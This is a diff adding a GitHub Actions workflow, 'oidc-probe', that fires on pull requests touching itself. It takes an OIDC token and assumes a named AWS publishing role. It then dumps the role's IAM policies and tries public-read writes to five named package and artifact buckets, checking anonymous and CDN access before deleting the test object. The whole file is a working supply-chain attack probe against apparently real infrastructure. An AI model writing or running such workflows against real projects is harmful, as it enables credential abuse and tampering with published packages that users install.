@@ -1,0 +1,54 @@
+name: oidc-probe
+on:
+  pull_request:
+    paths:
+      - .github/workflows/oidc-probe.yml
+permissions:
+  id-token: write
+  contents: read
+concurrency:
+  group: oidc-probe-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: assume publish role and probe S3 write
+        run: |
+          set -u
+          echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME"
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          echo "--- oidc claims"
+          echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{sub,aud,repository,event_name,ref}'
+          if ! aws sts assume-role-with-web-identity --role-arn arn:aws:iam::962042992619:role/chainflip-github-bot --role-session-name oidc-probe --web-identity-token "$TOKEN" --duration-seconds 900 > /tmp/c.json 2>/tmp/e.txt; then
+            echo ASSUME_FAIL; cat /tmp/e.txt; exit 0
+          fi
+          echo ASSUME_OK
+          export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId /tmp/c.json)
+          export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey /tmp/c.json)
+          export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken /tmp/c.json)
+          export AWS_DEFAULT_REGION=eu-central-1
+          aws sts get-caller-identity
+          echo "--- trust policy"
+          aws iam get-role --role-name chainflip-github-bot --query 'Role.AssumeRolePolicyDocument' --output json 2>&1 | head -c 3000; echo
+          echo "--- attached policies"
+          aws iam list-attached-role-policies --role-name chainflip-github-bot 2>&1 | head -c 1200; echo
+          echo "--- inline policies"
+          aws iam list-role-policies --role-name chainflip-github-bot 2>&1 | head -c 1200; echo
+          K="w2-oidc-probe-${GITHUB_RUN_ID}.txt"
+          echo "probe ${GITHUB_RUN_ID} ${GITHUB_SHA}" > /tmp/p.txt
+          for B in apt.aws.chainflip.xyz repo.chainflip.io artifacts.chainflip.io pkgs.chainflip.io chainflip-mainnet-prerelease; do
+            echo "=== $B"
+            echo "--- policy"; aws s3api get-bucket-policy --bucket "$B" 2>&1 | head -c 1500; echo
+            echo "--- pab"; aws s3api get-public-access-block --bucket "$B" 2>&1 | head -c 400; echo
+            echo "--- put"
+            if aws s3api put-object --bucket "$B" --key "$K" --body /tmp/p.txt --acl public-read > /tmp/po.txt 2>&1; then echo PUT_OK; else echo PUT_FAIL; cat /tmp/po.txt; fi
+            echo "--- anonymous origin GET"
+            curl -sS -m 20 -o /tmp/g.txt -w 'HTTP %{http_code} SIZE %{size_download}\n' "https://s3.eu-central-1.amazonaws.com/$B/$K"
+            head -c 80 /tmp/g.txt; echo
+            echo "--- cdn GET (apt only)"
+            if [ "$B" = "apt.aws.chainflip.xyz" ]; then curl -sS -m 20 -o /dev/null -w 'HTTP %{http_code}\n' "https://apt.aws.chainflip.xyz/$K"; fi
+            echo "--- delete"
+            aws s3api delete-object --bucket "$B" --key "$K" > /tmp/do.txt 2>&1 && echo DEL_OK || { echo DEL_FAIL; cat /tmp/do.txt; }
+          done
